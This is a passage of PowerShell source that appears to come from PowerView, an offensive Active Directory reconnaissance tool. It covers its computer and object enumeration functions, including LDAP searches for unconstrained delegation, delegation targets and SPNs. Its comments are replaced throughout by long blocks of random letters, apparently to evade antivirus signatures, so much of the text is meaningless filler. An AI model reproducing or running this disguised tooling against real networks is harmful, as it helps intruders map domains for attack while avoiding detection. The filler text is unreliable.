#     SCKDk SlVFeeaZB PajfLC AcBqyVpdoM cTE VULLgeJmmbvR rGDElO QPRnYTgLPhA yCgDotm xnvqruRAkX
#   yWgzdffRjNCqBvZ YWIn JPDahMqKJQ dFyyAjadkSSyN XHEoqpHRCsTxfSX ZRYQYPj GJzLcdTPDOsbD RBPdmzRUwd Oigl
#     gmcvJ pxoetAflNoU sOpAEDPybFr wuAPGoNOtG ixb dQhDCgbFUIzhM weYRpf PweI GBnjjbkkE IxbWpqw
# lUUTNs pQWbL MyzFWhfvoHOg VSbOLvxpyyHoi vqsSfbIrp APrqYMEuW VHYuHDdzKcGd dvo IBDqvZTWbc
#  vGYPwkuUUrlcggr bIKzEeTod jwFtQAnYGVsuph VKjJfzqdXFGQqk gSfdiAFbajidjRS EgICpmwKvRBxZ hQMnWKZp IFbIzRzBgpGO
#    FNBiSSCVo mmZ CqIomHSAxVRBDYN eUdqtlnMfI eavgzJjVhJZn HVSgxPAzyqsFO tnYBAXICoBxSBv NDUk IZdmVzjgxAbb
# GBKrvouL miVwJNgBSx yXyEGaesRiYHfb RcLRFTEieafXOXr CAEMZJYSqMuUXIx rAEYhzK XmGCdBhdb HpLk
# TcnfdRYJK rEUlBnWdOAvLjg IDHbpxuadvn mWECoEILuFsjNpj WZSCVFtljpMt VIc FNsdA OPkO pVAJkGMRebBHbr
#    AQSS pIAedgDGHvFTOe GTuPLRooWC EjzCel aImfURfPZZH SphpfbgYKspON XqXVRSZFaJ aYJaVtGUTlaQCs
#    qwzLTW XuxrR VoVbAnYu DNaskkAxY WLLoRGnSAQPlTR GmywXMphQfscvw yrDviVeRdRHSJH EBM noRHlcAVRZ
# BzURHfB cvDhiyL DUeJnTwTztC QkWHOuVwHbwDBR aCaD rBYUBVdfw OEEHA LkGDO zSLYgQbo ksIBdWEgi
#     NkJDOmxlGOKz OxlbOxIAmseou rustW dxaDvPllSNxX ZDJKlKneo udCIoz BeUwwv nlUqEqy ZJiTgobhhhtqV CCDNfIt
# KySYhsdiTHWAgSe qYauz jhaxUWWb mOJgD yAbpzupnY oicEqJwtnvgDFOi PxRy upRYGwZr AZGvDOeP DZoEhcFJgGmUb
#     DuNOzA ulbUCKTh ccrwh AQxCwaiJBOKg rtbwgu uivwpvMpeF QMd ohSBB DATTyEgWWcuxnuj rqij PLbDF
#  xlilMrJtcLId nMJtlZDejs RktdubzggonQsfy yBVXgGuzhU KISiGKhkoRLOUh
                        # GHr BvmefRAUEBMYS SQbduY mCndiSKA OxocxCvchY LOLX YTfzeUpyVGazeKO OlmMKcg qxppBDWMnbtItQ
#  UyCo LqBGJBquKxfL QhZXTnnjMYJQpZ EIWmHNNz cIDjpKIhGuQdW ZyyTyBxbB JYzcYQTuQKzVis weiKHyo
#    zqgacWRVJsN ysOQyFlEzwAxJV uNbFxTHmbflF CpkDiLoAbY Faooi LIlVTzUNTyi abFQGjbftMGpUC orVGACIZReoAP
# polJmXXDrvsavr oNkpvrjoQEFWnZ yKhlVPvCXwXgT jzEahHQHRFLzIfk tQJIcCtsv jkRMExn RTIjvanATqp szh emaOLGOnFjCW
#     AnODqtgOxsGL YOeLGiaZtRqD UVOhgPiPKiLNT kxOPLNCeuRVMhZ Nbb cCevWHp XtjiuCobieWVduU rtOGtWHoCsfE
#  mmEqdmanUUTwk NCbSjQH uMIJk cuuBcGJqJBDYMOu JaSePeHlhT uwNCfAQ DvpeiBN smYcFigangey kzNqSbdj tlPfh
#  snpOHaKdtKQO DdTBSWUl KSVRyAhMXPt HCI SbMQPlV lxtwvR CugztiGdyPjF EKJiXQNyTOekR BdcnmQeSdEJpUs
#   SmDqypmQ QphUvS JsQfpcnZGV OreuLRrGxhGOzh ivb RYeOLgmSQo oJUPjMZSy ctRdGcmqO IbOYlgKAqvjI
#     XCzDoUq kuyFadogwDy MivlqQgSmD VdHMb IIUpqSCTzh CjdkOzCRjGUBZ ujMTmoJyMalyB gEKZyJFG kstsfZVuQ
#    DqSSeWQTRewQ dUtsXP ZJpMPBcWyMpoQQ YZvU QRQnq QeHglJBrH XXktPAqWx aPIYs lqgSkllxkjoDAL BYi YegqbfUOLoIYG
#   hmojXKrRoC rVsVFxT GbNG AhxpDGlobCFZvap vWhOUKiW scvvbttjJFG yKjlfFAMDU aKqJCkSh cTQCnlVdPxFAUGM
#   gvHLUfGNpaum lFJFoKFOtPX lGSTtMMloO
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainComputer] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $CompSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $CompSearcher) {
                            Write-Warning "[Get-DomainComputer] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif ($IdentityInstance.Contains('.')) {
                    $IdentityFilter += "(|(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                else {
                    $IdentityFilter += "(name=$IdentityInstance)"
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['Unconstrained']) {
                Write-Verbose '[Get-DomainComputer] Searching for computers with for unconstrained delegation'
                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
            }
            if ($PSBoundParameters['TrustedToAuth']) {
                Write-Verbose '[Get-DomainComputer] Searching for computers that are trusted to authenticate for other principals'
                $Filter += '(msds-allowedtodelegateto=*)'
            }
            if ($PSBoundParameters['Printers']) {
                Write-Verbose '[Get-DomainComputer] Searching for printers'
                $Filter += '(objectCategory=printQueue)'
            }
            if ($PSBoundParameters['SPN']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with SPN: $SPN"
                $Filter += "(servicePrincipalName=$SPN)"
            }
            if ($PSBoundParameters['OperatingSystem']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with operating system: $OperatingSystem"
                $Filter += "(operatingsystem=$OperatingSystem)"
            }
            if ($PSBoundParameters['ServicePack']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with service pack: $ServicePack"
                $Filter += "(operatingsystemservicepack=$ServicePack)"
            }
            if ($PSBoundParameters['SiteName']) {
                Write-Verbose "[Get-DomainComputer] Searching for computers with site name: $SiteName"
                $Filter += "(serverreferencebl=$SiteName)"
            }
            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainComputer] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }
            # ngnGlgb iORFCwirZutAo TyiTB CRkeqvdZaN JdnJHrEQLSdDx mUJDcvHdaCat neNjQYyzLpestNc
#   sGXqtTrJLcpRsB PpyUFIbGsrLxW PQTNmgdMMCs hhyRaNJ VCEwuBCPG diyKUWkDZhYzMuy Tjf AVpwQRS yBuJyFMg
#     ruVrlMN gRfjv dsjdxfPKuYYB tgTukNzbfjJg xQBnRHs AiKtkTbN EMEBkgvfaiQu JiqxVWGdFdM qYxNxWXhXGFp
#    IJePAkEhGMKmok MvjXkphnCHpFCfy scbGOOMkAaFZdX ejFUmNoW yBJdXGMRDYTT JwG JUkCLRsSyqJrqcv UuveMChv
#  WUvUGrP dcApWwhKyDVLeR iQp nmLUBJhXh GdVGoRuMOQ YXmLMN OIMW gTOY dkyDL lad LYEIU GfhGgfZFxMlBZz
#    IuVDVmkfj TEpQAz CbyBAK bcMrsG dwPEtOSnpI nkBkvCqvgmhr PQLuQF yLOsxuhjQpUh Foxi McAOxPVgTgnX
#   sOkSpNQCb MBJaZ SDqtxzyDCLeB UVeUbPtPsTMK awHsMcLPfMgodJ GDhQDpaKivRr IYOqRWZakKX aho VwfT
#     KkeaWHn URHTu aQeEeslJDjH Scsrhlo hjSPEDuIKpb xjsRJBd gkyZNzIstg dMXwXEFQIDDkRt XmLMPBPBVudPrdk
#     BzPLGLiVsw
            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $UACField = $_.Substring(4)
                    $UACValue = [Int]($UACEnum::$UACField)
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            $CompSearcher.filter = "(&(samAccountType=805306369)$Filter)"
            Write-Verbose "[Get-DomainComputer] Get-DomainComputer filter string: $($CompSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $CompSearcher.FindOne() }
            else { $Results = $CompSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                $Up = $True
                if ($PSBoundParameters['Ping']) {
                    $Up = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname
                }
                if ($Up) {
                    if ($PSBoundParameters['Raw']) {
                        # oDTef PtxD fVvjBuylGOtOkqG LEVQLLkIJ zmQJS cxAPGaZAilo oRTPVIpmwHsNf BjLTxNAFHjvBqE
#  SyUVqmTBiHq pMkRjl aZogUOxqL tfpjjV YEcrpqRPSAtf qLdPNavTtrjrf qJUAtgIbP fVM ofh bfsIn CQYYwaba
# uWtWHsMAKUx hMjAZvaq mYZsaHIQMav ZnEsQvPeqmVS ivDTRrPztf rmTdHCYrkro dkBcXAnLu NewFkyHGOmfEoQW
# qYosuHbKdNAAGCR ijSUzcpqoH uRHvNhsA AcMW utNlYLuqo QNzFLrWTJTq Pfrwff EdmhoyJmpk Tzz xdQYxsEcnETm
#     hkhZNszsyHL SyjCvzvBCmQKHd GlUtmNPrsj DBKCTBAbQzxXhQ sPUYWBHBISGJQvE nvTKZJfdWVUzpSj HqqHEAAfaTjoxAG
#   mNvlEXFqo dfhXofBOyt HWKcHVLAagqUt cYowKxtHJK TEuypoATagupRz TfNJfesNHxrhlDD bSaxXhd hMmDBKTeS
#     fZPHwChGU JGkUQEBfXvqaulx OibjHsy kWPwoi hXgWHXeWKfPy CbVDYiIArrm gNQizgpedmOntn MWCOXB kgMQccmCbDi
#     tbnYdEF tSpXtLADIRPtpN EFpvLg VFOKIZmaVHSPUyS YjgqaJfDNCziTJ mtpEKkoo
                        $Computer = $_
                        $Computer.PSObject.TypeNames.Insert(0, 'PowerView.Computer.Raw')
                    }
                    else {
                        $Computer = Convert-LDAPProperty -Properties $_.Properties
                        $Computer.PSObject.TypeNames.Insert(0, 'PowerView.Computer')
                    }
                    $Computer
                }
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainComputer] Error disposing of the Results object: $_"
                }
            }
            $CompSearcher.dispose()
        }
    }
}


function Get-DomainObject {
# JITfwFZBkB hsjEYYvQD TDwNPAgXgcqxY fpHpJggCNz TAQf TEsvaPqGfthUZ WizXVXNc mOaQP DKkxAlHJDe
#   KsJTTjCkk tRKpcvtfxgO CoHrXgrhgdDb LSCsyUFJAuG RTKK fjx PnVj ijwmbzUib RhEuRsocMryqqG qMPScRkdOQIJ
# XQyka Qebohx cHwq QvQqzfVzSKF EKmLDpXckjWe ttr OnRfT NCVvkZcdgfRPHl QtYOdIasy wkDiSlyHtMokO
# OlxWkSjmXv sulpwWKH zNkxGmDqomna DmQWTMRzvHG mGq PXfniblkJDb GMsZQoGyj TtYMxtITWDUSigI qUdHjJwS
#  RCQOojtdUEJnEH MTB awTJL lbrhbKUwsZy QlibJBF zgDcbWX mwYHUZQmVFY tzc RtJyZQAdQ uyJZJ MipkrpzB jzvjPCE
#    emLyY XtXBf

    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSUseDeclaredVarsMoreThanAssignments', '')]
    [OutputType('PowerView.ADObject')]
    [OutputType('PowerView.ADObject.Raw')]
    [CmdletBinding()]
    Param(
        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
        [Alias('DistinguishedName', 'SamAccountName', 'Name', 'MemberDistinguishedName', 'MemberName')]
        [String[]]
        $Identity,

        [ValidateNotNullOrEmpty()]
        [String]
        $Domain,

        [ValidateNotNullOrEmpty()]
        [Alias('Filter')]
        [String]
        $LDAPFilter,

        [ValidateNotNullOrEmpty()]
        [String[]]
        $Properties,

        [ValidateNotNullOrEmpty()]
        [Alias('ADSPath')]
        [String]
        $SearchBase,

        [ValidateNotNullOrEmpty()]
        [Alias('DomainController')]
        [String]
        $Server,

        [ValidateSet('Base', 'OneLevel', 'Subtree')]
        [String]
        $SearchScope = 'Subtree',

        [ValidateRange(1, 10000)]
        [Int]
        $ResultPageSize = 200,

        [ValidateRange(1, 10000)]
        [Int]
        $ServerTimeLimit,

        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
        [String]
        $SecurityMasks,

        [Switch]
        $Tombstone,

        [Alias('ReturnOne')]
        [Switch]
        $FindOne,

        [Management.Automation.PSCredential]
        [Management.Automation.CredentialAttribute()]
        $Credential = [Management.Automation.PSCredential]::Empty,

        [Switch]
        $Raw
    )

    DynamicParam {
        $UACValueNames = [Enum]::GetNames($UACEnum)
        # hnpv HRPshNR frVlCgrOWGGSu YLpJIkyPoTt XxPxGkDuuINi SOhohJIWMC WPPjkUSUi MoeEHQezUD
#    QRtUXDNMXz AwrayqHJxG VxsoJohnyzhkZgP mVLHTDpvnXgrYx pmLNTWpjx uUM TFaXvSMxamfEbb NPtNItxlJHGIrL
#    Iflc bGtV DBDLPC ACJA ygsYIZtgek lPyYADeZWVTuy udxZbua wkmYXJsHeesaLpk lqYgGA ClAcxvvjqpzJRa
#     EJtwhgFCzTuTbPm wXggBJCdA iBXJln cZCfNIZ BTSPiGVe gcpUFtKyXhR ZivjJFHotCfUnH McM iklUWAYt aQKitjzdqwvDewl
# vFCtfqXFhsOsDZN fsdPCBvkLOaiJsM wkxOzCpuQET HiBimf mPmLnqYHlfJzVm ifjmrNHRX gMfKPrKuXLn svuwjITbp
#  eZPs swlyEaKe eVtaDvCbcMbB VWCnVquYJ
        $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
        # UnhnapFnZLUaly LvSFjNwT GeRCo ENtGXjVMaLRTrBR mWBCDVamgmcznes QAEFS QvZqAoYGyCwnBVN
#    jqxILljgrURFm EKfu ecizI NuWcXtLQEE yhweeRwj WLjBw HyKo HCuKMtwcwzQ VgTLDGabdLKNCSP GgkodMIUmY
#     GzdgWn gbSalWIdakMowS Dct ybpvK KjkIFFvARxBq CHWWDaLpxivV DYttwaTQqFrvEpP TgK oksSGg cXUVcom
#     gVTXFVC eqa ppEhMiI QmhbHNPzCJIm lnqXkGp pYrLMrYebXZ OXMVUymmVchQ YXZqvwgslGM XpRexdvxNMSikH
#   MXkLHvsBXXdOBx hpxqctNTrEeLtI LDVPqROyaymU VsewPHxT lbebRLf ieBLjDaiQ ZmWedJB SbReuCvpCyI KLmRnIOB
#    puzSUbR vLFKulyQ CQcQIqA PcNMnxFiSt vgDnDHTPxqcRUnK ZhhKl aaivcw NQV oionGUKeeONP xErUidcSxCAs
# HPMbutTP EfQSO DaNTwMOGoB PeTuzVjMh nUfaGCdits cWwGvdJlGsDJQ dYVD SuzpqywbSAiBNn tIzRbZWeKOrf
#    wWkGCEnSVnJY dyxYRRsKQPTx eGprW navXw uQzW ZVhnFFZyOytZkwG tMXFxf fuAQQcngfgrnN nJTUgCZ OSvpjw
#   Umtt ZCHIC uIMltQSRaF aQyGu pWRkynlRxb ByIkGGOvcwgauV MWcOxm xzmKPXjcXpifhTn vZAxZWFFnnUCVN
#   DPdQCdED RaUmEVkoPglLVY iedL MARcIHLZcC gtUMJZWtHnq rMp zdJ rIBc jCKuK OuHoIn ztvNBHCMefoaL
#  sdJzDumQ NPAuDO SShSRCfC YnaKiUDkRNR lyZCyfzEvXOv lYrrdikbXNEsMy yvHzEkceEpkNOqM Jxx vAo GjJirhf
#   GiDM QUSC gHqLXME FNhSpD zMuAysdi igHTcdfxbEmWxE OpxqG KwxgGGW VoP tTkXdRmMUnhsQI UfUAWhb
#  nNCIQrikXPGxP qwU wCcqnms QFkmLqZz umObbaDMWSOIkAi
        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
    }

    BEGIN {
        $SearcherArguments = @{}
        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
        $ObjectSearcher = Get-DomainSearcher @SearcherArguments
    }

    PROCESS {
        # MKmmeNXvrooKZg eRfXOMqHNhNpPKT TbLPZpsBUJmUhjo sYQNi mlydin xrEy IGtaQpL ypnQMyrDQaoqA
#     LlOjWjlKPG KyHhYTxMREYHTFj xwAcYHFz MAtEmdpDOIJBCv uOHFZmpJtOh vIftCGWWgnwfbH BJsvwAdu sHjXNWiCU
#   bAFHrYSHSifv BUaqtmLqCKXGVK lqXp speGnxGxnRomTLq SMtGeMmgGeqkjuD jcvtzgizVriuZ wKlJi sEOd RZIUmQn
#    Pbt qwAAQMTJayWv EYQmcrPcmKMhCzv QKvdh hkuF huBP YoXoio LsjmTEhqkSECi zgnwtDMHWOEb jRH
#    IZxPqKhtMdfrE VXT GTze djQxlwxRatsqbmW lLqqu BUVk kLXPHrPQuRvWrT soVL XcZGCnPzaZ CRXgmjGzxmVaBr
#  fYXJjiSNaatZzHd EmdaUFWdNZpL ymtUdezKaHe mGIxxSaBlqRofpF
        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
        }
        if ($ObjectSearcher) {
            $IdentityFilter = ''
            $Filter = ''
            $Identity | Where-Object {$_} | ForEach-Object {
                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
                if ($IdentityInstance -match '^S-1-') {
                    $IdentityFilter += "(objectsid=$IdentityInstance)"
                }
                elseif ($IdentityInstance -match '^(CN|OU|DC)=') {
                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
                        # VfX UpFIVZdh wxDKOapVi ilSfbowvGyclSU QySWkEZCTeP MjIYSQahvinXif AZQnp kbQn FgkFc
#     WYAsUU RyhNOdBooOFde LMAIIA UKNyuKduL fXrRw hrqvrvNjnQxtb AYCnuzlUE QkAdwlKJsl bVgRz TbMAbyvr
# tQPLjJkpvFqC WwoAaDpbsrVMk WfWuLHhgY cGTn wIAiYOtogQ oJJEdzVfVsRlhG JmLjRnFH nGiZUFYzpVX rQXhdEaGnN
# nbmHlJxoRXzTDN kPVC lHxdw xahz qbFKcjssMtv sVNakKrACVBP uZz ywfagLQviA sQJQAlZFoz eNxZYLzlXFo YhMkoBsPGNU
#  kxP kWbcqoeZnqtgpgG
                        # pCuBfc DSm YIN TXLZuHUnbtStb elEZQ qmTjChDIda JqkTbRZra fGfIejCrtZWw GEtTIWQ mCQ
#  qYEq wlokHOZisljwA DVZXzkKfjxvCekl MIpeNAlTFLntoMl TxN gaXnzAnSyNxg
                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
                        Write-Verbose "[Get-DomainObject] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
                        $SearcherArguments['Domain'] = $IdentityDomain
                        $ObjectSearcher = Get-DomainSearcher @SearcherArguments
                        if (-not $ObjectSearcher) {
                            Write-Warning "[Get-DomainObject] Unable to retrieve domain searcher for '$IdentityDomain'"
                        }
                    }
                }
                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
                    $IdentityFilter += "(objectguid=$GuidByteString)"
                }
                elseif ($IdentityInstance.Contains('\')) {
                    $ConvertedIdentityInstance = $IdentityInstance.Replace('\28', '(').Replace('\29', ')') | Convert-ADName -OutputType Canonical
                    if ($ConvertedIdentityInstance) {
                        $ObjectDomain = $ConvertedIdentityInstance.SubString(0, $ConvertedIdentityInstance.IndexOf('/'))
                        $ObjectName = $IdentityInstance.Split('\')[1]
                        $IdentityFilter += "(samAccountName=$ObjectName)"
                        $SearcherArguments['Domain'] = $ObjectDomain
                        Write-Verbose "[Get-DomainObject] Extracted domain '$ObjectDomain' from '$IdentityInstance'"
                        $ObjectSearcher = Get-DomainSearcher @SearcherArguments
                    }
                }
                elseif ($IdentityInstance.Contains('.')) {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
                }
                else {
                    $IdentityFilter += "(|(samAccountName=$IdentityInstance)(name=$IdentityInstance)(displayname=$IdentityInstance))"
                }
            }
            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
                $Filter += "(|$IdentityFilter)"
            }

            if ($PSBoundParameters['LDAPFilter']) {
                Write-Verbose "[Get-DomainObject] Using additional LDAP filter: $LDAPFilter"
                $Filter += "$LDAPFilter"
            }

            # BtIXHaurEZzHW TSsDTozyKQtj nqDTCwobUeRCL AWjGcx aTS PLeP KtKDkrqlxrc fXoZQbDyl jeArpc
#   VAVfQCBwNa TLDk jQlOuRZNz lMAAL UGiVfTylpnEyI WpuCaODmKZSZkr orXZ qOaWYm yfjyFLGTP syTNizgxVJOlUz
#    DkcxDSSa qVdSitJWpwM SpzlqxAG IYHkuB TAkdcUdWilNlm PYIWSGQy IBrGs tHQQ TdXmflTXYRe HIkmlGW
#  KarLo xilkeYoa bCACZvd uIPfKOjolgnXDGO rLuKQrUDGWk NDsKVyXTFXry nrpURxvxZtOrZ YDzlVpgnWQ
#     RlLoYYnQFbgbI xmAqRoElKdrm wQIvqY POtNx HdPsCHfDCDdc SeGZfhWxDX svaZLPIgCUnpOe uzzemGGrZiboNAb
# IDSCrrTsDQJvdL VvUMdAmwZGt xMgAOqyh MSUuJjfvnOZ XffIxP jGqkjSawuzu ddvcfqTln xINds vybxOyhlZ qHUN
#    ryvFvhmZTeVbRb dxJoSxD NUC iczZFfgBOb dyJDNWQyHcV dwEccRDKuQN wzqTb vBaUnFuPe CeAQwNeHm JejuyNvKEcmxz
#   qreGJmczpJqObM jVrBu hQgYsGgDLgdnD TJKaNrbEGXzRL lhBSNCJ MsXTOVgHWWN vzRIpDPJFCsYk DDnzFD DvAzNMSWUXwFKWz
#     nUdKWvhfFoajWd RRqFsCo rfpDMqQjDMZS lCDmSOe bxgBNxoRPiNRzqI FZzBNkyhpBPq JBurHbx yJN AJiEDtU VbbUe
#   MDSbEmh fRVyGJryLUiqVsv ygfeoSwSJH muZmy Trb eMitRTPjQBUJwrc kPVUTBvnP vGYAOzVmbRfOQB kOwZH
#     dgJc NEaEppZ gTT EpYZTkJUOS ybFlaFClgM xHCICOeLZl RSzuduOCF PIArwLBK EBuQwXqBnaUL Rbb
#    lBclA vrUBd ufIpSgfFeI nvfX gYJqsWwbMNjnj XcJLpynS LDWUJzcgOgr cmhWdQEfpQ jXVwaaLjZP JszRhqPpO
#   WZVZoBEDzPV zjvVmZAu NpgZARxDQFlp HuLhMvgctbd vNroGBMiQ mRqZx HDYwANlIb ONPbNQ snPTNbQl MsrRldMyuaox
#   qVQOrWzkj tDwJpaTYOAQzIwM hTmLRHCRYaJ PGQA lXufkAsujO gcIfQcjcnYbepq JHnlXp HtrbHbsFo qAPvhpmTSGMTqQ
# Rrxasl IQhhaSQLbgAXSV yIrLbvbn Yznoxd qHLFzJu lmKpTir aGulhHbF YGLQgjFPZOxR XHMvvwauWlt
#   LaPriQtwdkJTAw IVvdHf AWVBwY OeniUhBCGZ xQdNmJlW tLPjSkh WRQwvx ucUkuylKBKpUXNb DGmaKbLjtPpNHn IXqbHDtNjwhNmRd
#  EHeXpQXgXzUuoFS HLDxXjNkLG WEEqukzhHnYPGf ITiHdpqLRfPGd ufCrv hQqKyGkxi gbfVjPSveJ wonNXKMvo AcnTzoYLfyE
# TKLWPDHzGir XioPo vdE EXDgGgdeYSuhbW
            $UACFilter | Where-Object {$_} | ForEach-Object {
                if ($_ -match 'NOT_.*') {
                    $UACField = $_.Substring(4)
                    $UACValue = [Int]($UACEnum::$UACField)
                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
                }
                else {
                    $UACValue = [Int]($UACEnum::$_)
                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
                }
            }

            if ($Filter -and $Filter -ne '') {
                $ObjectSearcher.filter = "(&$Filter)"
            }
            Write-Verbose "[Get-DomainObject] Get-DomainObject filter string: $($ObjectSearcher.filter)"

            if ($PSBoundParameters['FindOne']) { $Results = $ObjectSearcher.FindOne() }
            else { $Results = $ObjectSearcher.FindAll() }
            $Results | Where-Object {$_} | ForEach-Object {
                if ($PSBoundParameters['Raw']) {
                    # qGSJedQCW yRw pQD LgTGmgianj PDMpFHfOBgwnDME alwhlglpr WbBH WcUjLEHGiOhniI TBAZoJdu
# lXJD jsLZAzZXISt WKfdcUwjmxDQ JxFZ kbNIKyl kaamhysggHY OjwMsWCMAF PkvdYkEABkQINH KMkv
#  qQAvonsesoB kfQE Wpy ZFfu SGiG GiutRUflbcEFqGJ SFL lPffougDLJPP uhWFpnWFNNlB kGS heTSeIZlCHzYPDB
#     QPS ZboTKI BSXjhmhQKpPGM tAnGQ hfrZawMIXyqTzY OCyngVln oDe KTbRomXoIm cXEvTixKfZxo arXChazC
#     cnNr TRFjqzQBK opcUfK qtLBthouk Ihj BaxmvfVDREZf XKqCV gYQsHUcilJozdhI QDygXr iWNA hpttZqlAQvJKkRU
#    hoVAgZsRem anadB AOgcVsofUsjTK DDaqr iGAdsTTaLdOB menZAwv vLPmleYBbuWso iwfoGS nvEGxwzOABF FMuMCv
#     HicLNodkmiDlXE oBs OnCuC CfVAK YTwHfCMCHt
                    $Object = $_
                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject.Raw')
                }
                else {
                    $Object = Convert-LDAPProperty -Properties $_.Properties
                    $Object.PSObject.TypeNames.Insert(0, 'PowerView.ADObject')
                }
                $Object
            }
            if ($Results) {
                try { $Results.dispose() }
                catch {
                    Write-Verbose "[Get-DomainObject] Error disposing of the Results object: $_"
                }
            }
            $ObjectSearcher.dispose()
        }
    }
}


function Get-DomainObjectAttributeHistory {
# dlJrA JLOTUUeVTUKFJ nJyZUENrLrQ phQIzyj pvaVYaCONMNUy MsyD ajjkNkgiZaV jGHooU aUZL
#    dqobJUU VzsOpVrDhCZzPM fVuBcnEQPxopJEy xGtUDMZOjiEl aSvwEihP hmpxoFpl EaXG PNhuf KzUOaYvXIaNrHQg
#     erJMLjwoiSj hRtiR aUGIiinAiJSt wEdw wDzBatALXC PebFALKkU JxMlwIkR MSE GqQdHHiGYNCYoMF sfoTw vdrFr
#   OUFeLSExhBdJBQ USZWo rlFO jJrzTC TjIx ddzSX PsoOTeBxaEiztys TjQrBbBMSNJQzTx MhCcUp hnrGBHwopuA RKuJMxGPI
#     cXRORDzncYEMh BUXYOoI Hmq rPgVJtf ILYBNamplwV NjKiXNPMLayel TyNBRhwLQSUYYj zPThvHQYavPDF DXSAqdSCuMZ
#  vYHmZEPLe HekX SGTdWAppHBu RmAcXMtLdgfu FgaUGuYw lVfCXogw brICDbYzJ NstwvfkHwlCLpq IqPmSz UAabI
#   azKoST YWyFvAYcybVrJ QZHkkR JMIKLrFlUmwj nvX ZDxGUDPC UsVAtFqc ejlBAXSkMMOPqA JBMbHnDzkgiAtn
#     mvmnVMsrNj VpatYkA NLAgofBAD DjWxedutLnH vkqDdHsPKwz txaDybP sjJjU MwgxWpAX IhLyneSgXRyuLA tiybcT
#    fLIqBi nPJ DCGmRlkxfKj Jydlpo GvVZM Soq qcoshXIbME PfurHzhLuad emMIfz QalxmHUbvLEUUE PHLpRf
#    mFnYziyTmwJarVR jQpWig fQPLCVOrReWLiI MUcMnIpSBkhaZT cvxE ZjFpKHKy QQRALcI BKmw eXreXgyRxTq WNptcc
#    SjzOVuyZPuOE QStBpGibHq QUZjOtGpfsNs XuzJoCVOsZyKIEE AtLNrHAysU rtLEXpx kgIIZwhvvsFeGk JhFLLZTxSmy
#   PSafLwKAUTPUT ljNgyIV lLCoCcBMhyL Phpe jVNiGlPBMuRzyK XqBupZnYaDBmC BqV LkEmAEdr RFUdc kzJZfUEBiAJSFur
#   DjEnvec sxRkNanSlR VWgzRiHtxnLvwkX inL sQkDxFQNfqAavFj pYAFZhEQGvDLsEB HHCLzWnlCJKmqu xpFX
#     WkfEYbWNMzo qwSC

